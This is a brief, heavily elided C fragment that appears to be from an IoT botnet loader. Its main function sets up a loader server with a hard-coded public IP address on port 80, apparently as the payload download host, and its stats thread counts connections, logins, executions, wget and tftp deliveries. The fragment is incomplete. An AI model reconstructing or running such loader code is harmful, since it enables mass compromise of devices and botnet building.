...
int main(int argc, char **args)
{
    ...
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "13.250.50.104", 80, "13.250.50.104")) == NULL)
    {
...
static void *stats_thread(void *arg)
{
    ...
    {
#ifndef DEBUG
        printf("%ds - Conns: %d - Logins: %d - Executed: %d - Echoes: %d - Wgets: %d, Tftps: %d\n",
